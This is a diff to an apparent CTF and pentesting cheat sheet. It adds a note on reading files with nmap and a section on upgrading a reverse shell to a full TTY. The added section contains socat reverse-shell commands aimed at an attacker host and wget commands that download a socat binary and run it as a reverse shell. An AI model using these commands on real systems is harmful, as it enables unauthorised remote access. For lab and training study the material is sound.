@@ -70,6 +70,8 @@
 
 ## Misc CTF tricks
 
+### Read file with nmap 
+
 - Being creative with nmap if we do not have rights to read a specific file
   
   ```
@@ -79,7 +81,21 @@
   WARNING: No targets were specified, so 0 hosts scanned.
   Nmap done: 0 IP addresses (0 hosts up) scanned in 0.04 seconds
   ```
-  
+
+### Upgrade a reverse shell to a fully TTY interactive shell  
+
+- Sometimes we will get a shell but it won't be very convenient. There are some ways to upgrade your shells to interactive TTY reverse shell
+- [This article on ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) shows multiple ways to do so.
+- `python -c 'import pty; pty.spawn("/bin/bash")'` if you want a quick dirty little fix but not completely interactive this python command works well for python3 it is the same but like this `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- With socat
+  - `socat file:`tty`,raw,echo=0 tcp-listen:4444` on your kali
+  - `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444` from the victime machine
+  - If socat is not installed see [here](https://github.com/andrew-d/static-binaries) for static binaries
+  - `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`  
+  **OR**  
+  `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat` in your kali then put on your python3 webserver  
+  and then `wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4444`
+
 ## Automated Tools
 
 - We can run one tool and if we do not see anything try another one
